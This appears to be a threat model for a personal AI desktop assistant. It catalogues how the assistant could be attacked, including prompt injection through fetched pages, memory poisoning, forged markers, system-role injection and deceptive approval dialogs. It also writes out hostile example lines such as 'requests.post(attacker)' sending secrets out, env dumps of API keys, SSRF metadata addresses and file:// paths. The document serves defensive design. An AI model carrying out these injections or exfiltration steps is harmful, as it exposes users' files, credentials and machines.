# JARVIS Unified Threat Model

*PHASE INFINITY, Research Cycle 10. §18 artifact #9 — extracted from embedded sources and unified.*
*Date: 2026-10-19. Status: analysis complete, unvalidated on a real design review.*
*Sources: `~/workspace/jarvis-build/FAILURE-ANALYSIS.md` (v1 autopsy) · `~/workspace/learning/security/hardened_runner.py` + `test_hardened_runner.py` (19/19 pass) + `LEARNINGS.md` · `learn-fault-trees.md` (Cycle 4) · `learn-attack-trees.md` (Cycle 5) · `learn-privacy-engineering.md` · `DECISION-PLAYBOOK.md` (S1–S8).*

*Reading rule: every attack below is traceable to one of these. Uncovered cells are listed, not hidden — no "we're secure" theater.*

---

## 1. Assets — ranked by impact of compromise

| # | Asset | Impact if compromised | Why it ranks here |
|---|---|---|---|
| 1 | **Full PC control** (code execution as Owais) | Catastrophic | Every other asset falls with it. v1 handed this to any web page (C-S1+C-S2). |
| 2 | **Credentials & secrets** (API keys, Telegram token, SSH keys, passwords, session cookies) | Severe | Keys buy cloud/API access; SSH keys buy other machines; tokens buy the Telegram channel itself. |
| 3 | **Personal files** (documents, photos, browser profiles) | High | Irreplaceable; exfiltratable via C-S3 file-read + C-X1 no-egress-control. |
| 4 | **Memory / knowledge base** (poisoning = persistent backdoor) | High | One poisoned session → malicious instruction in every future turn (C-S6). Persistence makes it worse than a one-shot injection. |
| 5 | **Voice, audio, screenshots, camera** | High | Surveillance-grade. Screen captures to Google (H-X8); mic always-on default (M-X9). |
| 6 | **Conversation content sent to cloud brains** | Medium–High | Clipboard, file contents, diagnostics leave the machine every turn (M-X5, M-X6) with no classification. |
| 7 | **Compute & quota** (Tavily searches, API spend, socket exhaustion) | Medium | H-S7 unbounded parallelism burns quotas; H-X10 Telegram spam = compute DoS. |
| 8 | **Availability** (app launches and stays up) | Medium | v1 had multiple won't-start paths (C-B3, C-I1), but these are reliability, not security, except where an attacker can trigger them (log-disk-fill, malformed scheduler input via voice — H-I7). |

---

## 2. Trust boundaries — what crosses, how it's enforced (never by prompt alone)

| Boundary | What crosses it | Enforcement mechanism | v1 failure it answers |
|---|---|---|---|
| External content → Model | Tool outputs (web pages, transcripts, files, API responses) | R2: nonce-framed `<tool_output trust="untrusted">`, instruction hierarchy in system prompt; REA markers. **Detection is a tripwire, not the wall** (LEARNINGS §2, §4). | C-S1, C-S5, H-S8, H-S9, H-X1, H-X2, M-S25 |
| Model → Tools | Tool calls with arguments | S2 capability declarations per skill; `validate_tool_call` schema check (exact-type, no unknown args); R3 gate for destructive ops | C-S4, H-S2–S4, H-X3, M-S33 |
| Tools → OS | File I/O, subprocesses, network | R4 filesystem jail (`jail_path`: resolve + `relative_to` check, absolute/`..`/symlink/drive-letter rejected); R5 sandbox (`shell=False` hardcoded, `env={}`, binary blocklist, timeout); egress allowlist | C-S2, C-S3, C-X1, C-X4 |
| User → Gate | Approval decisions | R3: out-of-band UI confirmation (button/inline yes), enforced in code before dispatch; single-use nonces bound to action hash; synchronous check-and-dispatch | C-S4, H-X3, H-X4, FTA cut sets, attack-tree findings 1–4 |
| Memory → Model | Retrieved facts, preferences | M4: provenance tags + trust levels on every write; quarantine for untrusted sources; low-trust memories never auto-acted on; verify-before-acting | C-S6, fault-tree 4 (3-element AND) |
| App → Cloud providers | Prompts, screenshots, audio | R13 opt-in defaults; data classification before send **(GAP — see §6)**; local-first routing | H-X8, M-X5, M-X6 |
| Secrets → Anywhere | Keys, tokens, passwords | R9: OS keyring storage only; fail-closed redaction filter on every log/display path; secrets never in URLs, query params, or git-tracked config | C-I4, H-X5–X7, M-X1–X4, M-X7, M-X14–X19 |

---

## 3. Adversary profiles

| ID | Adversary | Capabilities | Goals | Out of scope? |
|---|---|---|---|---|
| P1 | **Malicious web content publisher** | Publish pages/PDFs/APIs; SEO; get content fetched in a relevant task | RCE or exfiltration via injection (C-S1 path) | No — primary web threat |
| P2 | **Malicious skill author** | Publish a skill (marketplace/sideload); arbitrary top-level code at import | Persistence, RCE on next start (H-S1) | No |
| P3 | **Compromised provider / network MITM** | Intercept downloads; poison update channel; tamper DNS | Code execution via updater/installer (C-X2, C-X3) | No |
| P4 | **Borrowed phone / hijacked Telegram session** | Send messages as Owais; static allowlist ID | Full remote PC control (C-X6) | No |
| P5 | **Malicious local app / malware already on PC** | Read files, tamper logs, read process memory | Key theft, log forgery (D1/D2), nonce capture (C1) | Partially — assumes PC already compromised; defenses still raise cost |
| P6 | **Physical access** | Disk access, cold boot | Everything | **Yes — out of scope.** Mitigation is BitLocker + OS login, not JARVIS's job. Stated, not ignored. |

---

## 4. Attack catalog (deduplicated)

Each entry: vector → boundary crossed → coverage (test / cut set / requirement) → mitigation layer → residual risk.

### Injection cluster (external content → model)

| ID | Attack | Vector | Boundary | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|---|
| A1 | Prompt injection via tool output → RCE | Malicious page/API/file fetched by browser skill; directive in `innerText` | External→Model, then Model→Tools→OS | `test_attack_injection_is_framed_and_flagged`; R2 | Nonce framing + instruction hierarchy + R5 sandbox as backstop | **[MC]** Paraphrase/encoding/chunk-split bypass the *detector* (verified: base64 → zero hits). Structural defenses (no shell strings, jail) carry the real weight. Payload laundering (F1) bypasses R2's gate-evasion framing. |
| A2 | Marker forgery | Attacker writes fake closing marker inside payload, smuggles instructions after it | External→Model | `test_attack_marker_forgery_rejected` | Per-call random nonce; refuse to frame content containing marker stems | [HC] Covered if nonce entropy holds and the refuse-to-frame path is tested. |
| A3 | Memory poisoning (slow burn) | False instruction persisted via A1/A2/direct chat; retrieved at a tier-3 decision | External→Memory→Model | Fault-tree 4 (3-element AND: quarantine + provenance + verify) | M4: provenance tags, quarantine, verify-before-acting | **[MC]** No stated test that provenance *survives retrieval*. Dropping any one layer collapses the cut set to size 2. |
| A4 | Injection with SYSTEM-role authority | Research output appended as `{"role": "system"}` (v1 `main.py`) | External→Model (privilege escalation) | R2 | Never emit system-role content from tool output; role is assigned by code, not by content | [HC] Covered by construction if the role-assignment rule is enforced in review. |
| A5 | Consulted-brain injection hop | Injection in consulted brain's answer pasted as tool result into driver context | Model→Model | R2 | Same framing on inter-brain content; consulted brain gets reduced toolset | [MC] Both brains share the injection surface; framing must apply at the hop. |
| A6 | Voice phishing via screen watcher | Attacker-controlled pixels → vision model → spoken aloud verbatim | External→Model→Speech | R2 framing of watcher output; R13 opt-in | Watcher remarks framed as untrusted; never speak raw model text | [MC] Pixels are untrusted content (multimodal study). Framing a spoken remark is weaker than framing text — needs a spoken-content policy. |

### Execution cluster (model → tools → OS)

| ID | Attack | Vector | Boundary | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|---|
| B1 | Unsandboxed `execute_code` RCE | Any injection (A1) or direct model misuse | Tools→OS | `test_attack_shell_string_rejected`, `test_attack_sh_c_blocklisted`, `test_attack_shell_metachars_are_literal_not_executed`, `test_attack_timeout_kills_long_run` | R5: `shell=False` hardcoded, string commands rejected at type level, binary blocklist, timeout, `env={}` | **[MC]** Subprocess sandbox ≠ VM. A Windows-specific escape (beyond blocklisted binaries) is untested. E2B/Firecracker deferred — accepted (see §6). |
| B2 | Filesystem escape (`..`, absolute, symlink, `\`, drive letter) | Malicious path argument to file tools | Tools→OS | `test_attack_dotdot_escape_blocked`, `test_attack_absolute_path_blocked`, `test_attack_symlink_escape_blocked`, `test_attack_windows_backslash_escape_blocked`, `test_attack_drive_letter_and_home_blocked` | R4/S5: `resolve()` + `relative_to()` before any handle opens | **[MC]** TOCTOU between check and use (symlink swapped after resolve). Windows ADS streams (`file.txt:evil`) not in the test list — **gap**. |
| B3 | PowerShell injection via `type_text` | Newlines breaking out of single-quoted string (v1 stripped only `'`) | Tools→OS | `test_attack_wrong_arg_types_rejected` (partial) | No shell strings; argument validation; preferlist-based input tools | [MC] Covered if `type_text` never builds shell commands. Needs the code-level rule. |
| B4 | Malicious skill import RCE | Drop-in `skills/evil/skill.py`; top-level code runs at startup | Supply→App | R11, S7 | Manifest-declared skills; new-skill user approval before first import; quarantine + scan | **[MC]** "Scan" is unspecified — what the scanner checks is undefined. Approval UX is the real gate. |
| B5 | Destructive action before confirmation | `taskkill /IM /F` executes before the gate (v1 ordering bug); `os.startfile("C:\\evil.exe")` | Model→Tools | R3 | Gate check is the first statement; no dynamic dispatch to actions — static allowlist of gate-wrapped entry points | [HC] Covered by construction + review rule. |
| B6 | LLM-mediated "confirmation" | Confirmation as text returned to the LLM; confused/injected model re-calls and it executes | Model→Gate | R3 | Out-of-band UI gate; conversational "yes" is never authorization; per-turn locked `_pending` state | [HC] Covered if no `if user_said_approved` shortcut exists — needs the code-audit rule (attack-tree A5). |

### Exfiltration cluster (secrets/data → outside)

| ID | Attack | Vector | Boundary | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|---|
| C1 | Unrestricted egress | `execute_code` + `requests.post(attacker)` with secrets | Tools→Network | R5 | Egress allowlist; blocked + logged otherwise | **[MC]** Allowlist maintenance burden; first-run UX. DNS exfiltration (encoding data in subdomain lookups) bypasses HTTP allowlists — **unstated gap**. |
| C2 | Secrets into logs/HUD/chat | Token-bearing exception URLs logged every 5s (C-I4); tool-arg dumps; `_safe_handle` returns exceptions to Telegram | Secrets→Disk/Network | `test_attack_secret_in_logs_redacted`, `test_redact_keeps_label_redacts_value` | R9: fail-closed `RedactingFilter` on every logger; secrets `register_secret()` at load; never log exception objects raw | [HC] Covered if *every* logger uses the filter — needs a startup audit (one unfiltered logger reopens it). |
| C3 | Child-process env inheritance | `subprocess.run` inherits `os.environ` → `env`/`printenv` reads `GEMINI_API_KEY` | Secrets→Child | `test_attack_env_exfiltration_blocked` | `env={}` hardcoded in `run_sandboxed` | [HC] Covered. The classic "default you didn't choose" — now chosen. |
| C4 | Secrets file world-readable | `secrets.local.yaml` with default umask; `x_cookies.json`, `instagram.session` plaintext | Secrets→Disk | R9 | OS keyring (Windows Credential Manager); ACL lockdown; keyring-only loader | [MC] Migration path from YAML to keyring must not leave the old file behind. |
| C5 | Secrets in URLs / query params | Telegram token in URL path; API keys as GET params (MyMemory) | Secrets→Network | R9 | Token via header/body; POST for keyed requests | [HC] Covered by rule; needs review of every integration. |
| C6 | Clipboard into cloud context | `clipboard_get` pulls passwords/2FA into LLM context → transmittable, speakable | User→Model→Cloud | *(none stated)* | **Gap:** secret-pattern detection on clipboard reads; confirm before sending clipboard to cloud brain | **[MC] UNCOVERED** — no mitigation named in any source. |
| C7 | Full history → cloud every turn | Clipboard, file contents, diagnostics leave the machine unclassified | App→Cloud | *(none stated)* | **Gap:** data classification before cloud send; local-first routing default | **[MC] UNCOVERED** — named as concern (M-X5), no enforcement designed. |
| C8 | Screenshots to disk unencrypted | `JARVIS_screenshots/` on disk, default perms, LLM-triggerable | App→Disk | R13 | RAM-only captures; no disk writes; opt-in with egress disclosure | [MC] Covered by policy; needs the code rule (never `imwrite` outside a user-initiated, consented flow). |

### Supply-chain cluster

| ID | Attack | Vector | Boundary | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|---|
| D1 | Unsigned updater → RCE on restart | Repo compromise → malicious `git pull` → "restart JARVIS" (LLM-triggerable, no confirm) | Supply→App | R10, S8 | Signed updates (minisign, verify-or-abort); no-downgrade rule; rollback to last-good; updater never LLM-triggerable | [MC] Key storage for the verify key is itself a target (fault-tree 3, G1). Two signing layers (minisign + Authenticode). |
| D2 | Unverified installer download | `OllamaSetup.exe` downloaded without checksum, then executed (LLM-triggerable) | Supply→App | R10, S8 | Checksum/signature verification before execute; no LLM trigger | [HC] Covered by rule. |
| D3 | LLM-triggerable `pip install` | Persona instructs model to pip-install on missing package | Model→Supply | R10, S8 | Dependency installs are user-confirmed UI actions only | [HC] Covered by rule + persona change. |
| D4 | Typosquat / compromised PyPI package | Unpinned `requirements.txt` (25+ deps); `twifork`, `snapchat-dlp` named risks | Supply→App | R10 | Lockfile + hashes (`pip-compile` + `--require-hashes`); `pip-audit` in CI; SBOM | [MC] Audit cadence unspecified. |
| D5 | Opaque model weights | Uncensored GGUF from unverified HuggingFace user (weaker refusal + supply risk) | Supply→Model | *(partial)* | Model provenance policy: prefer verified publishers; checksum-pinned downloads | **[MC] PARTIAL** — weights are inherently opaque; the mitigation is provenance + pinning, not inspection. |

### Remote-access cluster

| ID | Attack | Vector | Boundary | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|---|
| E1 | Telegram = full remote PC control | Static ID allowlist; borrowed phone / hijacked session → `brain.respond` with all tools | Remote→App | S2, R3 | Capability-scoped remote toolset (read-only default; no `execute_code` remotely); per-command confirmation for writes; remote command allowlist | **[HC] PARTIAL** — v1 gave the allowlisted sender *everything*. The scoping is designed, not yet enforced anywhere. Highest-priority remote hardening. |
| E2 | No rate limiting on Telegram | Compromised account spams full LLM turns → compute cost + PC DoS | Remote→App | *(proposed)* | Per-sender rate limits; circuit breaker on error loops; backoff on auth failure (C-I4's 5s-forever loop) | [MC] Unspecified thresholds. |
| E3 | Token placement in git-tracked config | `telegram_bot_token` in `config.yaml` → pushed to GitHub | Secrets→Public | R9 | Loader ignores secret-looking keys in `config.yaml` with a warning; keyring only | [HC] Covered by rule. |

### Browser cluster

| ID | Attack | Vector | Boundary | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|---|
| G1 | SSRF via browser tool | `http://localhost/`, `http://169.254.169.254/` (cloud metadata) | Tools→Network | R5 | URL validation: scheme + host allowlist; block link-local/loopback/metadata IPs | [MC] Needs the explicit blocklist (localhost, 169.254.0.0/16, 10/8, 192.168/16 — or invert to allowlist). |
| G2 | `file://` exfiltration | `file:///C:/…` pulls local files into LLM context | Tools→Model | R5 | Scheme allowlist (http/https only) | [HC] Covered by rule. |
| G3 | Ghost-browser credential steering | Injected page steers LLM into form fills on phishing pages | External→Model→Web | R3 | No credential autofill without explicit user confirmation per site; cert-error hard stop | **[MC] PARTIAL** — the confirmation rule exists; cert-error handling was "not visible" in v1. |

### Approval-gate adversarial (attack-tree findings)

| ID | Attack | Vector | Covered by | Mitigation | Residual risk |
|---|---|---|---|---|---|
| F1 | **Payload laundering** — real dialog, false description ("clean temp files" → deletes documents) | Injection authors the dialog text | **NONE STATED** | Deterministic payload renderer: dialog built from the action object (type + target + params, machine-formatted); brain text labeled untrusted | **[HC] UNCOVERED — P0.** Cheapest path with the weakest defense. R2 blocks gate *evasion*, not *what the user sees*. |
| F2 | **Log as authorization oracle** — rewrite hash chain, forge approval event | Log write access | **NONE STATED** | Design rule: gate NEVER consults the log as proof of approval (live token only; log is audit-only) + external anchor for the chain | **[HC] UNCOVERED.** Tamper-evident ≠ tamper-proof; no anchor specified. |
| F3 | **Manufactured fatigue** — burst of low-stakes prompts, slip tier-3 into the burst | Prompt generation via A1/A2 | Named but unspecified | Concrete burst threshold + step-up friction (re-read prompt, cooldown); anomaly flags on unusual-for-user actions | **[MC] UNSPECIFIED.** No threshold exists. |
| F4 | **Nonce-store tampering** — un-burn a used single-use nonce | Nonce store access | Unspecified | Used-nonce set lives in the gate's integrity domain (process-private memory), never shared with the log layer | **[MC] UNSPECIFIED.** |

---

## 5. Coverage matrix — attacks × mitigation layers

Layers: **L1** R2 framing/hierarchy · **L2** R3 out-of-band gate · **L3** R4 filesystem jail · **L4** R5 sandbox + egress allowlist · **L5** R9 secrets/keyring/redaction · **L6** R10/S8 update integrity · **L7** R11/S7 skill manifest + quarantine · **L8** S2 capabilities · **L9** M4 memory provenance/quarantine · **L10** R13 privacy defaults · **L11** hardened_runner test suite · **L12** FTA/attack-tree design rules.

● = covered · ◐ = partial/conditional · ○ = uncovered

| Attack | L1 | L2 | L3 | L4 | L5 | L6 | L7 | L8 | L9 | L10 | L11 | L12 | Verdict |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| A1 injection→RCE | ● | | | ● | | | | ● | | | ● | | Covered (defense in depth: framing + sandbox + capabilities) |
| A2 marker forgery | ● | | | | | | | | | | ● | | Covered |
| A3 memory poisoning | ● | | | | | | | | ● | | | ● | Covered (3-layer AND) — provenance-survival test missing |
| A4 system-role injection | ● | | | | | | | | | | | ● | Covered by construction rule |
| A5 consulted-brain hop | ● | | | | | | | ● | | | | | Covered if framing applies at the hop |
| A6 voice phishing (watcher) | ● | | | | | | | | | ● | | | Partial — spoken-remark policy missing |
| B1 unsandboxed exec | | | | ● | | | | ● | | | ● | | Covered |
| B2 filesystem escape | | | ● | | | | | | | | ● | | Covered (5 escape variants tested); ADS untested |
| B3 powershell injection | | | | ● | | | | | | | ◐ | | Partial — needs the no-shell-command rule in review |
| B4 malicious skill | | | | | | | ● | ● | | | | ● | Partial — "scan" unspecified |
| B5 destructive-before-gate | | ● | | | | | | | | | | ● | Covered by gate-first ordering rule |
| B6 LLM-mediated confirm | | ● | | | | | | | | | | ● | Covered if no `user_said_approved` shortcut (audit rule) |
| C1 unrestricted egress | | | | ● | | | | | | | | | Partial — DNS exfiltration unstated |
| C2 secrets in logs | | | | | ● | | | | | | ● | | Covered if every logger filtered (startup audit needed) |
| C3 env inheritance | | | | ● | | | | | | | ● | | Covered |
| C4 secrets file perms | | | | | ● | | | | | | | | Covered by keyring migration (old file cleanup needed) |
| C5 secrets in URLs | | | | | ● | | | | | | | ● | Covered by rule |
| C6 clipboard → cloud | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **UNCOVERED** |
| C7 full history → cloud | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **UNCOVERED** |
| C8 screenshots to disk | | | | | | | | | | ● | | ● | Covered by RAM-only policy |
| D1 unsigned updater | | ● | | | | ● | | | | | | ● | Covered (verify-or-abort + no LLM trigger) |
| D2 unverified installer | | ● | | | | ● | | | | | | | Covered |
| D3 LLM pip install | | ● | | | | ● | | | | | | | Covered |
| D4 typosquat/unpinned | | | | | | ● | | | | | | | Partial — audit cadence unspecified |
| D5 opaque weights | | | | | | ◐ | | | | | | | Partial — provenance + pinning, not inspection |
| E1 telegram full control | | ● | | | | | | ● | | | | | Partial — remote scoping designed, not enforced |
| E2 telegram no rate limit | | | | | | | | | | | | | **UNCOVERED** (thresholds unspecified) |
| E3 token in git config | | | | | ● | | | | | | | ● | Covered |
| G1 SSRF | | | | ● | | | | | | | | | Partial — blocklist must be explicit |
| G2 file:// exfil | | | | ● | | | | | | | | | Covered by scheme allowlist |
| G3 phishing credential fill | | ● | | | | | | | | | | | Partial — cert-error handling unspecified |
| F1 payload laundering | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **UNCOVERED — P0** |
| F2 log as auth oracle | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **UNCOVERED** |
| F3 manufactured fatigue | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **UNCOVERED** (unspecified) |
| F4 nonce-store integrity | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **UNCOVERED** (unspecified) |

**Uncovered/unspecified cells (honest list):** C6, C7, E2, F1, F2, F3, F4 — seven. Partial cells: A6, B3, B4, C1, D4, D5, E1, G1, G3 — nine. Everything else has at least one enforced layer.

---

## 6. Residual risks — what we accept, and why

| # | Risk | Why accepted (not hand-waved) | What would change the verdict |
|---|---|---|---|
| 1 | **F1 payload laundering (P0)** | Accepted *temporarily*: the deterministic payload renderer is a defined build task, not a research problem. Interim: brain-generated dialog text labeled untrusted; high-stakes dialogs show raw action parameters. | Renderer shipped + test asserting dialog text derives from the action object. |
| 2 | **Rubber-stamping (FTA B10/B11)** | Cannot be engineered away — it is a human behavior. Mitigated structurally: fewer, higher-stakes gates (sliding-scale autonomy), visible payloads, 30s undo buffer, anomaly flags. The 2026 consent research says notice-and-choice doesn't work; we don't pretend it does. | Measured rubber-stamping rate from production; burst-friction tuning (F3). |
| 3 | **Provider-side data retention** | Cloud brains retain prompts per provider policy; JARVIS cannot recall them. Accepted because local-first is the default and every cloud call is the user's explicit tier choice. | Local models covering the capability; currently the 2060 runs 7B, frontier tasks still need cloud. |
| 4 | **Subprocess sandbox ≠ VM escape** | A Windows sandbox escape is possible in principle. Accepted because: capability scoping (S2) + jail (R4) + no-shell-strings make the *reachable* attack surface small, and E2B/Firecracker is deferred, not dismissed — revisit trigger: any sandbox-escape PoC against our exact configuration. | Firecracker microVM adoption (documented in goldmines as EV 61.2). |
| 5 | **Opaque model weights** | GGUF binaries cannot be inspected, only provenance-checked. Accepted with publisher-preference + checksum pinning. The alternative (no local brain) is worse for privacy. | Reproducible-weight initiatives; currently none practical. |
| 6 | **C6/C7 cloud-bound data** | Accepted *temporarily*: classification-before-send is a defined build task. Interim: local-first default keeps most traffic on-device; user is told what the cloud tier implies. | Data-classification layer shipped; clipboard secret detection. |
| 7 | **Physical access (P6)** | Out of scope by design. The mitigation is BitLocker + OS login, documented in setup preflight. JARVIS does not defend against an attacker holding the disk. | Nothing — correctly out of scope. |
| 8 | **Zero-day in dependencies** | Accepted with `pip-audit` cadence + SBOM + pinning. Cannot be eliminated; only shortened in window. | Shorter audit cadence; fewer dependencies (every dep is attack surface). |

---

## 7. The three sentences

1. **v1's core sin was detection-mindset security**: flags checked nowhere (`workspace_only_writes`), confirmations as text to the LLM, gates the model could emit — every critical finding is a check that didn't execute.
2. **v2's doctrine is structural**: make the bad outcome unrepresentable (no shell strings exist to inject into; no path leaves the jail; no approval exists except the UI gate's) — then test the structure (14 attack tests, Hypothesis properties, Z3 on the permission model).
3. **The remaining holes are all on the human side of the gate** (what the user *sees* in the dialog, whether they *read* it, what *they* approve under fatigue) — the cheapest attack path is deceiving Owais, not defeating the code. That is where the next hardening sprint goes.

---

## Confidence & unknowns

- [VC] on v1 findings (read from source), test names/counts (read from file), S1–S8 (read from playbook), FTA cut sets and attack-tree findings (read from files).
- [HC] on the coverage verdicts — single-analyst synthesis; a second reviewer would find missing branches (Schneier's warning applies to this document too).
- [MC] on residual-risk acceptance reasoning — these are judgment calls, documented so they can be challenged.
- [UK] Whether the Tauri trusted-chrome dialog actually defeats overlay attacks (frontend spike pending); real IPC surface for TOCTOU; measured rubber-stamping rate; Windows ADS-stream handling in the jail; DNS-exfiltration coverage.

## References

- `~/workspace/jarvis-build/FAILURE-ANALYSIS.md` — v1 autopsy, R1–R14
- `~/workspace/learning/security/hardened_runner.py`, `test_hardened_runner.py` (19/19 pass), `LEARNINGS.md`
- `~/workspace/jarvis-knowledge/learn-fault-trees.md` — Cycle 4
- `~/workspace/jarvis-knowledge/learn-attack-trees.md` — Cycle 5
- `~/workspace/jarvis-knowledge/learn-privacy-engineering.md` — data lifecycle, deletion checklist
- `~/workspace/jarvis-knowledge/DECISION-PLAYBOOK.md` — S1–S8
- Schneier (1999), *Attack Trees* — via learn-attack-trees.md
